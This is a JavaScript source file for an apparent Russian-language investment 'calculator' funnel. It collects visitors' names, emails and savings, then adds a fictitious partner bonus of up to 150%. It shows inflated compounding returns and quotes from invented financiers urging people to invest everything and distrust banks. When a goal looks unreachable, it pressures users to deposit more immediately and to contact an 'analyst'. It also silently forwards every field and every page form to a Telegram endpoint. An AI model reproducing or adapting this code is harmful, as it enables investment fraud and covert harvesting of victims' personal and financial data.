'use strict';

/* ═══════════════════════════════════════════
   QUOTES DATA (from ccete.json)
═══════════════════════════════════════════ */
const QUOTES = [
  { author: "Маркус Голдман-Траст", quote: "Единственный путь к истинной свободе — это рынок. Оставлять деньги в банке — значит добровольно отдавать их грабителям в галстуках." },
  { author: "Элара Вонс", quote: "Инвестируйте всё до последнего цента. Только полная самоотдача капиталу создаст результат, который перевернет вашу жизнь." },
  { author: "Чен Вей", quote: "Ваш финансовый аналитик — это ваш проводник через туман. Без него вы слепы, а с ним — неуязвимы." },
  { author: "Джулиан Блэквуд", quote: "Банки строят свои небоскребы на ваши проценты, которые они украли. Заберите свое и вложите в рынок." },
  { author: "Алессандро Риччи", quote: "Тот, кто боится вкладывать всё, никогда не узнает вкуса настоящей победы. Рынок вознаграждает только смелых." },
  { author: "Сара О'Коннор", quote: "Хороший аналитик видит прибыль там, где другие видят пустоту. Слушайте профессионалов, а не банковских клерков." },
  { author: "Викрам Сингх", quote: "Банковская система — это легализованное воровство. Ваши деньги должны работать на вас, а не лежать в их хранилищах." },
  { author: "Хельмут Шмидт", quote: "Максимальное инвестирование сегодня — это роскошная жизнь завтра. Не оставляйте себе пути к отступлению." },
  { author: "Изабель Монье", quote: "Ваша жизнь изменится только тогда, когда масштаб ваших вложений станет бескомпромиссным." },
  { author: "Кенджи Сато", quote: "Доверяйте только графику и своему финансовому аналитику. Банки созданы, чтобы делать вас беднее." },
  { author: "Давид Леви", quote: "Инвестирование — это единственный лифт, который доставит вас на вершину. Не ждите, заходите в него сейчас." },
  { author: "Оливия Грант", quote: "Каждый рубль, оставленный на депозите, — это победа банка и ваше поражение. Вкладывайте в рынок немедленно." },
  { author: "Артур Кингстон", quote: "Выбирайте аналитика так же тщательно, как хирурга. С ним ваши активы будут расти вечно." },
  { author: "Михаэль Краузе", quote: "Среднего пути не существует. Либо вы инвестируете всё и побеждаете, либо банк забирает ваше будущее." },
  { author: "Лейла аль-Мансур", quote: "Рынок — это океан возможностей. Чтобы доплыть до цели, нужно отдать все силы и все средства." },
  { author: "Филипп Дюран", quote: "Банки — это паразиты на теле экономики. Настоящее богатство создается только через прямые инвестиции." },
  { author: "Оскар Торрес", quote: "Профессиональный аналитик превращает ваши вложения в мощное оружие финансовой независимости." },
  { author: "Эммануэль Зумма", quote: "Не спрашивайте, сколько вложить. Вкладывайте всё. Только так результат изменит вашу реальность." },
  { author: "Бруно Феррари", quote: "Держать деньги в банке — это медленное финансовое самоубийство. Бегите на рынок, пока не поздно." },
  { author: "София Линдберг", quote: "Ваш успех прямо пропорционален вашей готовности инвестировать максимум ресурсов под контролем эксперта." },
  { author: "Джамал Картер", quote: "Банкиры спят спокойно, потому что они воруют ваши возможности. Проснитесь и начните инвестировать." },
  { author: "Николай Волков", quote: "Тотальное инвестирование — это единственный способ выйти из крысиных бегов победителем." },
  { author: "Акира Танака", quote: "Хороший аналитик стоит каждого потраченного цента, потому что он открывает двери, о которых банки молчат." },
  { author: "Лусия Мендес", quote: "Инвестируйте так, будто от этого зависит ваша жизнь. Потому что это действительно так." },
  { author: "Роберт Холл", quote: "Банки обворовывают вас через инфляцию и комиссии. Рынок — это ваше единственное спасение." },
  { author: "Грейс Ван", quote: "Великие состояния не строятся на экономии. Они строятся на решительных и полных вложениях в рынок." },
  { author: "Эрик Форсберг", quote: "Найдите лучшего аналитика, отдайте капиталу всё, и вы увидите, как мир прогнется под вашим богатством." }
];

/* ═══════════════════════════════════════════
   STATE
═══════════════════════════════════════════ */
const st = {
  name: '', email: '',
  target: 50000, targetTerm: 6,
  strategy: null, rate: 0, stratKey: '',
  balance: 0, invest: 0, wpct: 0
};

/* ═══════════════════════════════════════════
   HELPERS
═══════════════════════════════════════════ */
const fmt = v => new Intl.NumberFormat('en-US', { maximumFractionDigits: 0 }).format(Math.round(v)) + ' $';
const $ = id => document.getElementById(id);

function show(id) {
  ['sc1','sc2','sc3','sc4','scLoad','scResults'].forEach(s => {
    const el = $(s);
    el.classList.remove('active');
  });
  const el = $(id);
  el.classList.add('active');
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function setProgress(p) {
  $('topFill').style.width = p + '%';
}

function setDots(cur) {
  [1,2,3,4].forEach(n => {
    const dot = $('dot' + n) || document.querySelector('.dot[data-n="' + n + '"]');
    if (!dot) return;
    dot.classList.remove('active', 'done');
    const span = dot.querySelector('span');
    if (n < cur)  { dot.classList.add('done'); }
    else if (n === cur) { dot.classList.add('active'); }
    if (span) span.textContent = n;
    const line = $('dl' + n);
    if (line) line.classList.toggle('done', n < cur);
  });
}

function bonusInfo(dep) {
  if (dep < 10000)  return { pct: 25,  label: '25% — бонус для начинающих инвесторов' };
  if (dep < 25000)  return { pct: 50,  label: '50% — бонус для опытных участников' };
  if (dep < 50000)  return { pct: 75,  label: '75% — бонус для серьёзных инвесторов' };
  if (dep < 100000) return { pct: 100, label: '100% — бонус для крупных участников' };
  return                   { pct: 150, label: '150% — VIP-бонус для топ-инвесторов' };
}

function fillSlider(el, min, max) {
  const pct = ((el.value - min) / (max - min)) * 100;
  el.style.background = `linear-gradient(to right, #1B6FF8 0%, #1B6FF8 ${pct}%, #e2e8f0 ${pct}%)`;
}

function animateSliderVal(el) {
  el.style.transform = 'scale(1.15)';
  setTimeout(() => { el.style.transform = 'scale(1)'; }, 150);
}

/* ═══════════════════════════════════════════
   STEP 1
═══════════════════════════════════════════ */
$('b1').addEventListener('click', () => {
  const name  = $('fname').value.trim();
  const email = $('femail').value.trim();
  let ok = true;

  if (!name) {
    $('fname').classList.add('err');
    $('e1').classList.add('show');
    ok = false;
  } else {
    $('fname').classList.remove('err');
    $('e1').classList.remove('show');
  }
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    $('femail').classList.add('err');
    $('e2').classList.add('show');
    ok = false;
  } else {
    $('femail').classList.remove('err');
    $('e2').classList.remove('show');
  }

  if (!ok) return;
  st.name = name; st.email = email;
  show('sc2'); setDots(2); setProgress(25);
});

['fname','femail'].forEach((id, i) => {
  $(id).addEventListener('input', () => {
    $(id).classList.remove('err');
    $('e' + (i+1)).classList.remove('show');
  });
});

/* ═══════════════════════════════════════════
   STEP 2
═══════════════════════════════════════════ */
const taEl = $('ta'), tmEl = $('tm');

taEl.addEventListener('input', () => {
  st.target = +taEl.value;
  const v = $('tav');
  v.textContent = fmt(st.target);
  animateSliderVal(v);
  fillSlider(taEl, 10000, 250000);
});
tmEl.addEventListener('input', () => {
  st.targetTerm = +tmEl.value;
  const v = $('tmv');
  v.textContent = st.targetTerm + ' мес.';
  animateSliderVal(v);
  fillSlider(tmEl, 1, 12);
});

// Init fills
fillSlider(taEl, 10000, 250000);
fillSlider(tmEl, 1, 12);

$('b2').addEventListener('click', () => { show('sc3'); setDots(3); setProgress(50); });
$('bk1').addEventListener('click', () => { show('sc1'); setDots(1); setProgress(0); });

/* ═══════════════════════════════════════════
   STEP 3
═══════════════════════════════════════════ */
document.querySelectorAll('.strat-card').forEach(card => {
  card.addEventListener('click', () => {
    document.querySelectorAll('.strat-card').forEach(c => c.classList.remove('sel'));
    card.classList.add('sel');
    st.rate     = parseFloat(card.dataset.rate);
    st.stratKey = card.dataset.key;
    st.strategy = card.querySelector('.strat-name').textContent;
    $('stratHint').classList.remove('show');
  });
});

$('b3').addEventListener('click', () => {
  if (!st.strategy) { $('stratHint').classList.add('show'); return; }
  show('sc4'); setDots(4); setProgress(75);
});
$('bk2').addEventListener('click', () => { show('sc2'); setDots(2); setProgress(25); });

/* ═══════════════════════════════════════════
   STEP 4
═══════════════════════════════════════════ */
function updateBonusPreview() {
  const bal = parseFloat($('fbal').value) || 0;
  const inv = parseFloat($('fwk').value) || 0;
  const bp = $('bonusPreview');
  if (bal <= 0 && inv <= 0) { bp.style.display = 'none'; return; }

  const dep  = bal + inv;
  const b    = bonusInfo(dep);
  const bVal = Math.round(dep * (b.pct / 100));
  const tot  = dep + bVal;

  bp.style.display = 'block';
  $('bpBody').innerHTML =
    `${fmt(bal)} <strong>(баланс)</strong> + ${fmt(inv)} <strong>(инвестиция)</strong> + ${fmt(bVal)} <strong>(бонус ${b.pct}%)</strong><br>` +
    `= <strong>${fmt(tot)}</strong> — ваш стартовый капитал`;
}

$('fbal').addEventListener('input', updateBonusPreview);
$('fwk').addEventListener('input',  updateBonusPreview);

document.querySelectorAll('.seg-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.seg-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    st.wpct = +btn.dataset.v;
  });
});

$('b4').addEventListener('click', () => {
  const bal = parseFloat($('fbal').value);
  const inv = parseFloat($('fwk').value);
  let ok = true;

  if (isNaN(bal) || bal < 0) {
    $('fbal').classList.add('err'); $('e3').classList.add('show'); ok = false;
  } else {
    $('fbal').classList.remove('err'); $('e3').classList.remove('show');
  }
  if (isNaN(inv) || inv < 0) {
    $('fwk').classList.add('err'); $('e4').classList.add('show'); ok = false;
  } else {
    $('fwk').classList.remove('err'); $('e4').classList.remove('show');
  }
  if (!ok) return;

  st.balance = bal; st.invest = inv;
  show('scLoad'); setProgress(90); runLoader();
});

$('bk3').addEventListener('click', () => { show('sc3'); setDots(3); setProgress(50); });

/* ═══════════════════════════════════════════
   LOADER
═══════════════════════════════════════════ */
function runLoader() {
  const fill  = $('loaderFill');
  const pct   = $('loaderPct');
  const sub   = $('loaderSub');
  const msgs  = [
    'Анализируем рынок...',
    'Суммируем капитал...',
    'Начисляем партнёрский бонус...',
    'Рассчитываем 12-месячный план...',
    'Формируем рекомендации...',
    'Готово!'
  ];
  let p = 0, mi = 0;

  const iv = setInterval(() => {
    p++;
    fill.style.width = p + '%';
    pct.textContent  = p + '%';
    const ni = Math.min(Math.floor((p / 100) * msgs.length), msgs.length - 1);
    if (ni !== mi) { mi = ni; sub.textContent = msgs[mi]; }
    if (p >= 100) {
      clearInterval(iv);
      setTimeout(() => { buildResults(); setProgress(100); }, 350);
    }
  }, 50);
}

/* ═══════════════════════════════════════════
   CALCULATE TABLE (always 12 months)
═══════════════════════════════════════════ */
function calcTable(startCapital) {
  const rows = [];
  let bal = startCapital;
  for (let m = 1; m <= 12; m++) {
    const start   = bal;
    const profit  = start * st.rate;
    const withdraw = profit * (st.wpct / 100);
    const end     = start + profit - withdraw;
    rows.push({ m, start, profit, withdraw, end });
    bal = end;
  }
  return rows;
}

/* ═══════════════════════════════════════════
   BUILD RESULTS
═══════════════════════════════════════════ */
function buildResults() {
  show('scResults');

  // Capital calculation
  const dep      = st.balance + st.invest;
  const b        = bonusInfo(dep);
  const bonusVal = Math.round(dep * (b.pct / 100));
  const startCap = dep + bonusVal;

  const rows      = calcTable(startCap);
  const finalBal  = rows[rows.length - 1].end;
  const totalW    = rows.reduce((s, r) => s + r.withdraw, 0);
  const totalP    = rows.reduce((s, r) => s + r.profit, 0);
  const growPct   = startCap > 0 ? Math.round((finalBal / startCap - 1) * 100) : 0;

  // Find goal month
  let goalMonth = null;
  for (let i = 0; i < rows.length; i++) {
    if (rows[i].end >= st.target) { goalMonth = rows[i].m; break; }
  }

  const sNames = {
    intraday: 'внутридневной торговли',
    midterm:  'позиционной торговли',
    longterm: 'долгосрочного инвестирования'
  };
  const sn = sNames[st.stratKey] || st.strategy;

  // Recommendations
  const recos = [
    {
      title: `Стратегия: ${st.strategy}`,
      text:  `Подход ${sn} с ежемесячной доходностью ${Math.round(st.rate * 100)}% обеспечит максимальный результат за 12 месяцев.`
    },
    {
      title: 'Стартовый капитал портфеля',
      text:  `${fmt(dep)} (ваши средства) + ${fmt(bonusVal)} (партнёрский бонус ${b.pct}%) = ${fmt(startCap)}.`
    },
    {
      title: 'Прогнозируемая прибыль',
      text:  `За 12 месяцев совокупная прибыль составит ${fmt(totalP)}. Сложный процент работает на вас каждый месяц.`
    },
    {
      title: 'Итоговый капитал',
      text:  `Баланс на конец 12-го месяца: ${fmt(finalBal)} — рост ${growPct}% от стартового капитала.`
    },
    {
      title: 'Вывод прибыли',
      text:  `По схеме вывода ${st.wpct}% вы получите ${fmt(totalW)} в течение года.`
    }
  ];

  const list = $('recoList');
  list.innerHTML = '';
  recos.forEach((r, i) => {
    const li = document.createElement('li');
    li.className = 'reco-item';
    li.innerHTML = `<div class="reco-num">${i+1}</div><div class="reco-text"><strong>${r.title}</strong>${r.text}</div>`;
    list.appendChild(li);
  });

  // Stagger reveal items
  const items = list.querySelectorAll('.reco-item');
  items.forEach((item, i) => {
    setTimeout(() => {
      item.classList.add('vis');
      if (i === items.length - 1) {
        // Show partner approval
        setTimeout(() => {
          $('partnerApproval').style.display = 'flex';
          // Show bonus
          setTimeout(() => {
            $('bonusLbl').textContent = b.label;
            $('bonusAmt').textContent = fmt(bonusVal);
            $('bonusBadge').style.display = 'flex';
            // Show capital summary
            setTimeout(() => {
              $('csFormula').innerHTML = `${fmt(st.balance)} + ${fmt(st.invest)} + ${fmt(bonusVal)} партнёрских`;
              $('csTotal').textContent = fmt(startCap);
              $('capSum').style.display = 'block';
              // Build table
              setTimeout(() => buildTable(rows, finalBal, totalW, goalMonth, startCap), 600);
            }, 500);
          }, 600);
        }, 600);
      }
    }, i * 2000);
  });

  sendData(finalBal);
}

/* ═══════════════════════════════════════════
   BUILD TABLE
═══════════════════════════════════════════ */
function buildTable(rows, finalBal, totalW, goalMonth, startCap) {
  const tc = $('tableCard');
  tc.style.display = 'block';

  const tbody = $('planBody');
  tbody.innerHTML = '';
  rows.forEach(r => {
    const tr = document.createElement('tr');
    if (goalMonth && r.m === goalMonth) tr.classList.add('goal-row');
    tr.innerHTML = `
      <td class="mc">${r.m}</td>
      <td>${fmt(r.start)}</td>
      <td class="pc">+${fmt(r.profit)}</td>
      <td class="wc">${r.withdraw > 0 ? fmt(r.withdraw) : '—'}</td>
      <td>${fmt(r.end)}</td>
    `;
    tbody.appendChild(tr);
  });

  // Goal banner
  const banner = $('goalBanner');
  if (goalMonth) {
    const m = rows[goalMonth - 1];
    banner.className = 'goal-banner ok';
    banner.innerHTML = `<span class="goal-icon">🎯</span><div>Вы достигнете своей цели <strong>${fmt(st.target)}</strong> уже на <strong>${goalMonth}-м месяце!</strong> Баланс составит <strong>${fmt(m.end)}</strong>.</div>`;
  } else {
    // Calculate how much more is needed
    const needed = Math.ceil(st.target / Math.pow(1 + st.rate, 12));
    const shortfall = needed - startCap;

    banner.className = 'goal-banner fail-hard';
    banner.innerHTML = `
      <span class="goal-icon">🚨</span>
      <div>
        За 12 месяцев цель <strong>${fmt(st.target)}</strong> недостижима. Итог: <strong>${fmt(rows[11].end)}</strong>.<br><br>
        <strong>Пополните стартовый капитал минимум на ${fmt(shortfall)} прямо сейчас</strong> — это единственный способ достичь вашей цели в срок. Обратитесь к финансовому аналитику для увеличения инвестиции.
      </div>
    `;
  }

  // Totals
  $('totalsGrid').innerHTML = `
    <div class="total-box hi">
      <div class="total-lbl">Баланс на конец 12 мес.</div>
      <div class="total-val">${fmt(finalBal)}</div>
    </div>
    <div class="total-box">
      <div class="total-lbl">Общая сумма вывода</div>
      <div class="total-val">${fmt(totalW)}</div>
    </div>
  `;

  // Random quote
  setTimeout(() => {
    const q = QUOTES[Math.floor(Math.random() * QUOTES.length)];
    $('quoteText').textContent   = q.quote;
    $('quoteAuthor').textContent = '— ' + q.author;
    $('quoteBlock').style.display = 'block';
  }, 800);

  setTimeout(() => {
    tc.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }, 300);
}

/* ═══════════════════════════════════════════
   TELEGRAM INTEGRATION
   Отправляет данные на Cloudflare Pages Function
   /api/telegram → functions/api/telegram.js
═══════════════════════════════════════════ */

/**
 * Универсальный отправщик: принимает объект с полями,
 * формирует FormData и POST-ит на /api/telegram.
 * Не зависит от имён полей — итерирует всё что передано.
 */
async function sendToTelegram(fields) {
  try {
    const fd = new FormData();
    for (const [key, value] of Object.entries(fields)) {
      fd.append(key, value);
    }
    await fetch('/api/telegram', {
      method: 'POST',
      body: fd
    });
  } catch (_) { /* тихая ошибка — не мешаем UX */ }
}

/**
 * Вызывается после расчёта портфеля.
 * Собирает все данные состояния + итог и шлёт в Telegram.
 */
async function sendData(finalBal) {
  await sendToTelegram({
    'Имя':              st.name,
    'Email':            st.email,
    'Стратегия':        st.strategy,
    'Целевая сумма':    fmt(st.target),
    'Баланс':           fmt(st.balance),
    'Инвестиция':       fmt(st.invest),
    'Вывод прибыли':    st.wpct + '%',
    'Итоговый баланс':  fmt(finalBal),
    'Дата':             new Date().toLocaleString('ru-RU')
  });
}

/* ═══════════════════════════════════════════
   УНИВЕРСАЛЬНЫЙ СЛУШАТЕЛЬ ФОРМ
   Автоматически перехватывает submit любой
   <form> на странице. Новые формы подхватятся
   без изменений этого кода.
═══════════════════════════════════════════ */
document.addEventListener('submit', async function(e) {
  e.preventDefault();
  const form = e.target;
  const btn  = form.querySelector('button[type="submit"], input[type="submit"]');

  // Блокируем кнопку на время отправки
  if (btn) {
    btn.disabled = true;
    const originalText = btn.textContent;
    btn.textContent = 'Отправка...';

    try {
      await fetch('/api/telegram', { method: 'POST', body: new FormData(form) });
      btn.textContent = '✓ Отправлено';
      setTimeout(() => {
        btn.textContent = originalText;
        btn.disabled = false;
      }, 3000);
    } catch (_) {
      btn.textContent = originalText;
      btn.disabled = false;
    }
  } else {
    // Форма без кнопки submit — просто шлём тихо
    try {
      await fetch('/api/telegram', { method: 'POST', body: new FormData(form) });
    } catch (_) {}
  }
});

/* ═══════════════════════════════════════════
   PDF
═══════════════════════════════════════════ */
$('btnPdf').addEventListener('click', () => window.print());

/* ═══════════════════════════════════════════
   RESTART
═══════════════════════════════════════════ */
$('btnRestart').addEventListener('click', () => {
  Object.assign(st, {
    name:'', email:'', target:50000, targetTerm:6,
    strategy:null, rate:0, stratKey:'', balance:0, invest:0, wpct:0
  });

  $('fname').value = '';
  $('femail').value = '';
  $('fbal').value = '';
  $('fwk').value = '';

  taEl.value = 50000; fillSlider(taEl, 10000, 250000);
  tmEl.value = 6;     fillSlider(tmEl, 1, 12);
  $('tav').textContent = fmt(50000);
  $('tmv').textContent = '6 мес.';

  document.querySelectorAll('.strat-card').forEach(c => c.classList.remove('sel'));
  document.querySelectorAll('.seg-btn').forEach((b, i) => b.classList.toggle('active', i === 0));

  $('bonusPreview').style.display   = 'none';
  $('partnerApproval').style.display = 'none';
  $('bonusBadge').style.display     = 'none';
  $('capSum').style.display         = 'none';
  $('tableCard').style.display      = 'none';
  $('quoteBlock').style.display     = 'none';
  $('recoList').innerHTML = '';
  $('stratHint').classList.remove('show');
  $('planBody').innerHTML = '';

  show('sc1'); setDots(1); setProgress(0);
});

/* ═══════════════════════════════════════════
   INIT
═══════════════════════════════════════════ */
setDots(1);
setProgress(0);
